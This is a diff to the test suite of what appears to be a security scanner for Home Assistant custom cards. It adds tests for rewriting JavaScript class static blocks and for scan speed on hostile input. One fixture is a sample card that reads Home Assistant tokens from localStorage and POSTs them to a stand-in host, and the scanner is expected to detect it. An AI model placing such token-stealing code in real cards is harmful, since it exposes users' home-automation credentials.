@@ -179,12 +179,60 @@ def test_a_file_semgrep_could_not_read_is_read_after_the_rewrite(tmp_path):
     assert not {"scan-file-not-checked", "scan-parse-error"} & rules
 
 
+def test_normalize_js_turns_class_static_blocks_into_methods(tmp_path):
+    """0.15.0: Semgrep 1.185/1.186 can't parse `static { }`. Only a static block on its
+    own line is rewritten; properties, private names, longer words, a method called
+    `static` and `static` before a line break are left as they are."""
+    f = tmp_path / "c.js"
+    f.write_text(
+        "class A{static{this.x=1}static  {go()}}\n"
+        "o.static{};#static{};isstatic{};class B{static(){}};let q={static:1};\n"
+        "class C{static\n{y()}}\n"
+    )
+    assert normalize_js(tmp_path) == 1
+    assert f.read_text() == (
+        "class A{static __sniff_static_block(){this.x=1}static __sniff_static_block()  {go()}}\n"
+        "o.static{};#static{};isstatic{};class B{static(){}};let q={static:1};\n"
+        "class C{static\n{y()}}\n"
+    )
+
+
+def test_code_inside_a_static_block_is_read(tmp_path):
+    """A real card's map chunk lost code to its static blocks. After the rewrite the file
+    is read in full and what's inside a block is checked like any other code."""
+    card = tmp_path / "block-card"
+    (card / "dist").mkdir(parents=True)
+    (card / "hacs.json").write_text('{"name": "Block", "filename": "block-card.js"}')
+    (card / "dist" / "block-card.js").write_text(
+        "class Card {\n"
+        "  static {\n"
+        "    const t = localStorage.getItem('hassTokens');\n"
+        "    fetch('https://collect.invalid/c', {method: 'POST', body: t});\n"
+        "  }\n"
+        "}\n"
+    )
+    rules = _rules(scan(str(card), offline=True))
+    assert {"card-token-exfil", "card-read-tokens"} <= rules
+    assert not {"scan-file-not-checked", "scan-parse-error"} & rules
+
+
+def test_the_static_block_rewrite_stays_linear_on_hostile_input(tmp_path):
+    import time
+
+    f = tmp_path / "h.js"
+    f.write_text(("static" + " " * 50) * 20_000 + "static" + "\t" * 200_000)
+    t = time.perf_counter()
+    normalize_js(tmp_path)
+    assert time.perf_counter() - t < 2.0
+
+
 def test_unparseable_js_is_reported_not_silent(tmp_path):
     card = tmp_path / "odd-card"
     (card / "dist").mkdir(parents=True)
     (card / "hacs.json").write_text('{"name": "Odd", "filename": "odd-card.js"}')
-    # Semgrep (1.181, and still 1.185) can't parse class static blocks.
-    (card / "dist" / "odd-card.js").write_text("class A{static{this.x=1}}\n")
+    # A line that isn't JavaScript: the rest of the file is read, the line is reported.
+    # (Class static blocks were the example until 0.15.0 rewrote them; see below.)
+    (card / "dist" / "odd-card.js").write_text("var a = 1;\nvar b = (2 +;\nvar c = 3;\n")
     r = scan(str(card), offline=True)
     assert [f.file for f in r.findings if f.rule_id == "scan-parse-error"] == ["odd-card.js"]
 
@@ -223,8 +271,8 @@ def test_own_storage_access_is_not_flagged(tmp_path, fixtures):
 # --- full scans: need network (GitHub for HA constraints, PyPI, OSV) and all tools -----
 
 needs_tools = pytest.mark.skipif(
-    not all(shutil.which(t) for t in ("uv", "osv-scanner", "guarddog")),
-    reason="uv / osv-scanner / guarddog not installed",
+    not all(shutil.which(t) for t in ("uv", "osv-scanner")),
+    reason="uv / osv-scanner not installed",
 )
 
 
